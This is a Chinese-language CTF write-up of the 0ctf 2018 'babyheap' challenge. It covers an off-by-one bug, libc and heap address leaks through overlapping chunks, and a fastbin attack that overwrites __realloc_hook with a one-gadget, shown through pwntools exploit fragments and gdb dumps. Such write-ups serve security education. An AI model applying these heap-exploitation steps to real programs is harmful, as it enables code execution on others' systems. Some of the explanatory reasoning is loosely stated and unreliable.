---
title: 0ctf2018-babyheap
keywords: 0ctf-2018-babyheap
description: 0ctf-2018-babyheap-writeup
tags: pwn
abbrlink: 27029
date: 2018-08-06 23:16:39
---

# 前言

入坑pwn至今，基础知识了解了不少，是时候动手刷题了。这次以0ctf2018-babyheap为例，做个记录。首先，不得不提，writeup有很多，有的写得非常好，但是本人能力不足，理解起来比较费劲，不求甚解是原罪，特在此记录遇到坑点。

题目连接: <https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz> 

# 利用到的知识点如下:

+ overlapping_chunks
+ fastbin attack

# 题目分析

## 版本&保护措施

```shell
qianfa@qianfa:~/Desktop/0ctf/babyheap2018$ file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=07335c82a28f73c1c4ac099f3381bfebff27e5e5, stripped

pwndbg> checksec
[*] '/home/qianfa/Desktop/0ctf/babyheap2018/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

64位程序，所有保护全部开启。

## 功能

```
qianfa@qianfa:~/Desktop/0ctf/babyheap2018$ ./babyheap
    __ __ _____________   __   __    ___    ____
   / //_// ____/ ____/ | / /  / /   /   |  / __ )
  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |
 / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /
/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/

===== Baby Heap in 2018 =====
1. Allocate
2. Update
3. Delete
4. View
5. Exit
```

### allocate

分配指定大小的堆块，大小不超过0x58个字节。

```
if ( input_size > 88 )
	input_size = 88;
v3 = calloc(input_size, 1uLL);
```

### Update

输入堆块下标和输入数据长度，然后输入数据，这里存在off_by_one漏洞。

```c
v1 = *(_QWORD *)(24LL * v3 + a1 + 8) + 1LL;            // v1 = 当前堆块大小 + 1
if ( v4 <= v1 )
{
    printf("Content: ");
    sub_1230(*(_QWORD *)(24LL * v3 + a1 + 16), v4);
    LODWORD(v1) = printf("Chunk %d Updated\n", (unsigned int)v3);
}
```

这里的v1也就是`当前堆块的大小 + 1`,v4则是我们输入的长度，很明显，可以多输入一个字节，也就造成off_by_one漏洞。

### Delete

根据输入的堆块下标，将该堆块size置0，指针置0，并释放区块，没有问题。

```c
nodes_1[v2].size = 0LL;
free((void *)nodes_1[v2].data_ptr);
nodes_1[v2].data_ptr = 0LL;
```
### View

根据输入堆块下标，查看堆块内容。

### Exit

# 准备工作

## patch掉alarm函数

*功能与作用：alarm()函数的主要功能是设置信号传送闹钟，即用来设置信号SIGALRM在经过参数seconds秒数后发送给目前的进程。如果未设置信号SIGALARM的处理函数，那么alarm()默认处理终止进程。*

为了方便后续调试程序，先将该函数所在汇编代码patch掉。

这里推荐keypatch插件，安装教程可参考: https://www.cnblogs.com/zhaijiahui/p/7978897.html

第一步: 将一下两行汇编代码patch为nop。

```
mov     edi, 3Ch ; '<'  ; seconds
call    alarm
```

![](/assets/0ctf/TIM截图20180807171309.png)

![](/assets/0ctf/TIM截图20180807171500.png)

第二步: 保存patch后的程序。

Edit-> Patch Program -> Apply patches to input file。选中`Create backup`，保存即可。

![](/assets/0ctf/TIM截图20180807172900.png)

第三步: 修改保存后的patch程序后缀，添加x权限，运行。

## 自定义结构体

通过阅读伪代码，我们可以很容易看出一个结构体。

```c
*(_DWORD *)(24LL * i + a1) = 1;
*(_QWORD *)(a1 + 24LL * i + 8) = v2;
*(_QWORD *)(a1 + 24LL * i + 16) = v3;
```

```
struct struct_node{
  int inUse;
  int size;
  char* ptr;
}
```

为了方便阅读程序，可以在IDA中自定义结构体，并将其应用到伪代码中。

第一步：定义结构体。

​	选择Structures视图:

![](/assets/0ctf/TIM截图20180807172159.png)

​	输入快键键`Insert`,设置name。

![](/assets/0ctf/TIM截图20180807173437.png)

​	选中ends这一行,按大写的`D`,作为`inUse`字段。

![](/assets/0ctf/TIM截图20180807173703.png)

​	由于`inUse`字段为8个字节，所以需要选中`field_0         dq ?`,持续按`D`,直到`db`变为`dq`。

![](/assets/0ctf/TIM截图20180807174014.png)

​	然后在选中ends这一行，按大写的`D`,作为`size`字段，同理，将`db`设置为`dq`。

![](/assets/0ctf/TIM截图20180807174142.png)

​	所有字段都设置完毕之后，将三个字段 右键`rename`一下即可。

![](/assets/0ctf/TIM截图20180807174449.png)

第二步:  应用结构体。

​	以allocate函数为例，选中参数`a1`,右键选择`Convert ot struct *`

![](/assets/0ctf/TIM截图20180807174718.png)

​	选择我们刚刚定义的`struct_node`即可，代码可阅读性明显提高，耶！ 

![](/assets/0ctf/TIM截图20180807175005.png)

## exp准备

根据程序功能，编写相应的函数。

```python
from pwn import *

p = process('./babyheap')
context.log_level = 'debug'

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
 
def update(index, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)
 
def delete(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))
 
def view(index):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
```

# pwn

## 漏洞阐述

由于off_by_one漏洞的存在，在特定情况下，我们可以修改chunk_size。

```python
a  = alloc(0x28)
b  = alloc(0x20)
launch_gdb()
raw_input("x")
update(a,'A'*0x28)
p.interactive()
```

开始运行，内存如下:

```shell
pwndbg> x/10xg 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000031
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000000
0x555555757030:	0x0000000000000000	0x0000000000000031   |  0x31 = 0x30(size) | 1
```

输入x,内存如下:

```
x555555757000:	0x0000000000000000	0x0000000000000031
0x555555757010:	0x4141414141414141	0x4141414141414141
0x555555757020:	0x4141414141414141	0x4141414141414141
0x555555757030:	0x4141414141414141	0x0000000000000041   | 0x41 = 0x40(size) | 1
```

我们可以看到第二块的大小已经由0x31被修改为0x41。

## 泄露libc地址和main_arena地址

前置: main_arena是存储在libc.so的一个数据段 

```c
struct malloc_state {
    /* Serialize access.  */
    __libc_lock_define(, mutex);

    /* Flags (formerly in max_fast).  */
    int flags;

    /* Fastbins */
    mfastbinptr fastbinsY[ NFASTBINS ];

    /* Base of the topmost chunk -- not otherwise kept in a bin */
    mchunkptr top;

    /* The remainder from the most recent split of a small request */
    mchunkptr last_remainder;

    /* Normal bins packed as described above */
    mchunkptr bins[ NBINS * 2 - 2 ];

    /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/
    unsigned int binmap[ BINMAPSIZE ];

    /* Linked list, points to the next arena */
    struct malloc_state *next;

    /* Linked list for free arenas.  Access to this field is serialized
       by free_list_lock in arena.c.  */
    struct malloc_state *next_free;

    /* Number of threads attached to this arena.  0 if the arena is on
       the free list.  Access to this field is serialized by
       free_list_lock in arena.c.  */
    INTERNAL_SIZE_T attached_threads;

    /* Memory allocated from the system in this arena.  */
    INTERNAL_SIZE_T system_mem;
    INTERNAL_SIZE_T max_system_mem;
};
```

泄露方法：采用overlapping chunk技术。

```
alloc(0x48) #0                         |
alloc(0x48) #1                         |   注意: 这里应至少分配4个块，如果只
alloc(0x48) #2                         |   		分配3个块，那么删除第二个块的时候，
alloc(0x48) #3                         |         就会和top chunk合并，导致无法泄露信息
update(0, "A"*0x48 + "\xa1", 0x49)     # 修改1的chunk size为0xa1
delete(1)                              # 实际上是将1和2一起释放了
alloc(0x48)                            # 申请1
view(2)                                # 2我们是可以查看的
```

首先申请4个0x48个字节空间的区块，这样每个区块的大小都是0x50。然后填充区块1，并修改第2个块的大小为 0xa1, 这是因为 `0xa0 = 0x50  + 0x50`，这样，当我们删除第二个块的时候，第三个块也被删除，这时候我们再申请0x48个字节空间的区块时，这个块的索引依然为1，并将main_arean的地址写入第2个块中，而第2个块可以查看。

调试信息:

```
pwndbg> heap
0x555555757000 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x4141414141414141, 
  bk = 0x4141414141414141, 
  fd_nextsize = 0x4141414141414141, 
  bk_nextsize = 0x4141414141414141
}
0x555555757050 FASTBIN {
  prev_size = 4702111234474983745, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570a0 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570f0 {
  prev_size = 80, 
  size = 80, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757140 PREV_INUSE {
  prev_size = 0, 
  size = 134849, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

这样，我们就拿到了`<main_arena+88>`的地址`0x7ffff7dd1b78`。从而得到main_arena的地址`0x7ffff7dd1b20`。

通过vmmap我们可以找到libc加载的基地址。

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x43b4a1dfb000     0x43b4a1dfc000 rw-p     1000 0      
    0x555555554000     0x555555556000 r-xp     2000 0      /home/qianfa/Desktop/0ctf/babyheap2018/babyheap
    0x555555755000     0x555555756000 r--p     1000 1000   /home/qianfa/Desktop/0ctf/babyheap2018/babyheap
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/qianfa/Desktop/0ctf/babyheap2018/babyheap
    0x555555757000     0x555555778000 rw-p    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fda000     0x7ffff7fdd000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

这样，就可以得到本地libc的基地址相对于`main_arena+88`的偏移:

> `0x7ffff7dd1b78` - `0x7ffff7a0d000` = 0x3c4b78

于是，可以得到泄露地址脚本如下:

```python
def leak():
    alloc(0x48) #0
    alloc(0x48) #1
    alloc(0x48) #2
    alloc(0x48) #3
 
    update(0, 0x49, "A"*0x48 + "\xa1")
    delete(1)   #1
    alloc(0x48) #1
    view(2)    
    p.recvuntil("Chunk[2]: ")
 
    leak = u64(p.recv(8))
    libc_base = leak - libc_offset # libc_offset = 0x3c4b78 这是本地libc偏移，远程的偏移计算方法类似。
    main_arena = leak - 0x58
    log.info("libc_base: %s" % hex(libc_base))
    log.info("main_arena: %s" % hex(main_arena))
```

## 泄露heap地址

```python
def leak():
    alloc(0x48) #0
    alloc(0x48) #1
    alloc(0x48) #2
    alloc(0x48) #3
 
    update(0, 0x49, "A"*0x48 + "\xa1")
    delete(1)   #1
    alloc(0x48) #1
    view(2)    
    p.recvuntil("Chunk[2]: ")
    # now the 2nd block will contain the main_arena_addr
    # bins will will contain the 2nd block
 
    leak = u64(p.recv(8))
    libc_base = leak - libc_offset
    main_arena = leak - 0x58
    log.info("libc_base: %s" % hex(libc_base))
    log.info("main_arena: %s" % hex(main_arena))
 
    alloc(0x48) #4 = 2
    delete(1)  
    delete(2)
    view(4)
    
    p.recvuntil("Chunk[4]: ")
    heap = u64(p.recv(8)) - 0x50
    log.info("heap: %s" % hex(heap))
    return main_arena, libc_base
```

再次申请第5个0x48字节空间的块，该块和第3个块所指向的空间相同，这时候，删除第2个块和第3个块，由于fastbin 是由单链表链接，这时候，第2个块的地址将被写入第3个块，而第3个块和第5个块的内容一模一样，可以通过查看第5个块查看地址。

调试信息:

```shell
pwndbg> heap
0x555555757000 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x4141414141414141, 
  bk = 0x4141414141414141, 
  fd_nextsize = 0x4141414141414141, 
  bk_nextsize = 0x4141414141414141
}
0x555555757050 FASTBIN {
  prev_size = 4702111234474983745, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570a0 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x555555757050, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570f0 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757140 PREV_INUSE {
  prev_size = 0, 
  size = 134849, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

可以看到，第二个块地址为`0x555555757050`,而第2个块大小为0x50,所以可以得到heap的基地址`0x555555757000 = 0x555555757050 - 0x50`。

##修改top_chunk为 __realloc_hook附近的地址

**__realloc_hook是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 __realloc_hook 来 getshell。 **

```c
void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);
if (__builtin_expect (hook != NULL, 0))
	return (*hook)(bytes, RETURN_ADDRESS (0));
```

首先判断__realloc_hook的地址:

```shell
pwndbg> p __realloc_hook
$1 = (void *(*)(void *, size_t, const void *)) 0x7ffff7a92a00 <realloc_hook_ini>
pwndbg> p &__realloc_hook
$3 = (void *(**)(void *, size_t, const void *)) 0x7ffff7dd1b08 <__realloc_hook>
```

__realloc_hook的地址为`0x7ffff7dd1b08`。

内存信息：

```shell
pwndbg> x/20xg 0x7ffff7dd1ae8
0x7ffff7dd1ae8 <_IO_wide_data_0+296>:	0x0000000000000000	0x00007ffff7dd0260
0x7ffff7dd1af8:	0x0000000000000000	0x00007ffff7a92e20
0x7ffff7dd1b08 <__realloc_hook>:	0x00007ffff7a92a00	0x0000000000000000 |    <-- 目标地址
0x7ffff7dd1b18:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b28 <main_arena+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b38 <main_arena+24>:	0x0000000000000000	0x00005555557570a0
0x7ffff7dd1b48 <main_arena+40>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b58 <main_arena+56>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b68 <main_arena+72>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b78 <main_arena+88>:	0x0000555555757140	0x00005555557570a0     |   <-   top_chunk 地址 
```

计划如下: 修改top_chunk地址为`__realloc_hook` 上方附近，然后申请一个区块，覆盖`__realloc_hook`的地址。

代码如下:

```python
def exp(main_arena, libc_base):
    alloc(0x58) # 1
    delete(1)  # 1    

    addr = main_arena + 37             #  0x7ffff7dd1b45
    newtop = main_arena - 0x33         #  0x7ffff7dd1aed
    one = libc_base + one_offset
    log.info("addr: %s" % hex(addr))
    log.info("newtop: %s " % hex(newtop))
    log.info("one: %s" % hex(one))
 
    update(4, 9, p64(addr))
    alloc(0x48)                         # index = 1
    alloc(0x40)                         # index = 2  
    
    update(2, 0x2c, "\x00"*35 + p64(newtop))
```

**代码分析:**

* 代码段1:

```python
alloc(0x58) # 1
delete(1)  # 1
```

这里首先申请一个大小为0x58的块，目的是为了绕过malloc 的安全检查，chunksize 必须与 fastbin_index 相对应，初看 __malloc_hook 附近没有合适的 chunksize，这里需要巧妙的偏移一下。

检查如下:

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
```

校验: 当size是fastbin的情况下，如果从fastbin取出的第一块chunk的(unsigned long)size不属于该fastbin中的时候就会发生memory corruption(fast)错误。 主要检查方式是根据malloc的bytes大小取得index后，到对应的fastbin去找，取出第一块后检查该chunk的size是否属于该fastbin。 

查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 `victim->size & ~(SIZE_BITS))`，而它对应的 index 计算方法为 `(size) >> (SIZE_SZ == 8 ? 4 : 3) - 2`，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 `(size >> 4) - 2`。 

未分配该块之前 ，我们可以发现:

```
0x7ffff7dd1b28 <main_arena+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b38 <main_arena+24>:	0x0000000000000000	0x00005555557570a0
0x7ffff7dd1b48 <main_arena+40>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b58 <main_arena+56>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b68 <main_arena+72>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b78 <main_arena+88>:	0x0000555555757140	0x00005555557570a0     |   <-   top_chunk 地址 
```

top_chunk地址上方附近并无合适可用于size的字节。

分配该区块之后:

```
pwndbg> x/20xg 0x7ffff7dd1ae8
0x7ffff7dd1ae8 <_IO_wide_data_0+296>:	0x0000000000000000	0x00007ffff7dd0260
0x7ffff7dd1af8:	0x0000000000000000	0x00007ffff7a92e20
0x7ffff7dd1b08 <__realloc_hook>:	0x00007ffff7a92a00	0x0000000000000000
0x7ffff7dd1b18:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b28 <main_arena+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b38 <main_arena+24>:	0x0000000000000000	0x00005555557570a0
0x7ffff7dd1b48 <main_arena+40>:	0x0000555555757140	0x0000000000000000
0x7ffff7dd1b58 <main_arena+56>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b68 <main_arena+72>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b78 <main_arena+88>:	0x00005555557571a0	0x00005555557570a0
pwndbg> x/2xg 0x7ffff7dd1b45
0x7ffff7dd1b45 <main_arena+37>:	0x5555757140000055	0x0000000000000055
```

0x55即可帮助我们在malloc的绕过对size的验证，当然0x55是没用的, 接下来会说。

* 代码段2:

```python
addr = main_arena + 37             #  0x7ffff7dd1b45
newtop = main_arena - 0x33         #  0x7ffff7dd1aed
one = libc_base + one_offset
log.info("addr: %s" % hex(addr))
log.info("newtop: %s " % hex(newtop))
log.info("one: %s" % hex(one))

update(4, 9, p64(addr))
```

修改第3个块的fd指针，可以通过修改第5个块的内容来实现。

此时bins列表如下:

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x5555557570a0 —▸ 0x7ffff7dd1b45 (main_arena+37) ◂— 0x0
0x60: 0x555555757140 ◂— 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty

```

可以看到`0x7ffff7dd1b45`地址已经被写入fastbin中。

* 代码段3:

```
alloc(0x48)           | index = 1
alloc(0x40)           | index = 2
update(2, 0x2c, "\x00"*35 + p64(newtop))
```

现在再次申请两个区块，下标为1和2，此时下标为2的区块就包含我们的top_chunk地址，通过修改该区块的内容即可修改top_chunk的地址为我们指定的地址。当然，此时heap基地址以`0x55`开头，申请一定失败。

```
pwndbg> x/xg 0x7ffff7dd1b4c
0x7ffff7dd1b45 <main_arena+45>: 0x0000000000000055        |   <-- 失败
```

```
pwndbg> x/xg 0x7ffff7dd1b4c
0x7ffff7dd1b4c <main_arena+45>:	0x0000000000000056        |   <-- 成功
```

顺便提一下: 0xXXXXXXXX00000056，类似于这样的都行，因为size是int型，只占4个字节。

只有当heap基地址以`0x56`开头时，才能getshell。这是因为，如果以`0x55`开头的话，程序出错。只有开启地址随机化之后，heap基地址可能以`0x55`开头，也可能以`0x56`开头，多试几次即可。

偏移可通过` 35 = 0x7ffff7dd1b78 - 0x7ffff7dd1b45`计算得到。

0x55出错原因:

0x50         0 0 0                    √

0x51         0 0 1                    √

0x52         0 1 0                    √

0x53         0 1 1                     √   

0x54         1 0 0                     x

0x55         1 0 1                     x

0x56         1 1 0                     √

0x57         1 1 1                     √

0x58 ~~ 0x5f 同上，0x5c和0x5d也会出错。

三个标志位含义如下:             

NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。

IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。

PREV_INUSE，记录前一个 chunk 块是否被分配。

```assert (!mem || chunk_is_mmapped (mem2chunk (mem)) || av == arena_for_chunk (mem2chunk (mem)));```

chunk如果属于主线程，那么一定有mmap分配。所以0x54和0x55标志位有误，无法通过检测。

## getshell

```
alloc(56)
update(5, 28, "w"*11 + p64(one)*2)
alloc(22)
```

首先申请一个区块，由于fastbins中没有合适的区块，所以该区块将从top chunk中分配。

偏移可通过`11 = 0x7ffff7dd1b08 - 0x7ffff7dd1afd`得到。

最终可以getshell。需要注意的是，不一定能够得shell，需要多试几次，只有当heap基地址以`0x56开头`时才行，开启地址随机化之后，heap基地址可能以`0x55`开头，也可能以`0x56`开头。

# 参考链接

* [0ctf2018 babystack、babyheap、blackhole解析 ----- Chamd5团队](https://cloud.tencent.com/developer/article/1096977)
* [0CTF 2018 BabyHeap---- 看雪](https://bbs.pediy.com/thread-226037.htm)
* https://amritabi0s.wordpress.com/2018/04/02/0ctf-quals-babyheap-writeup/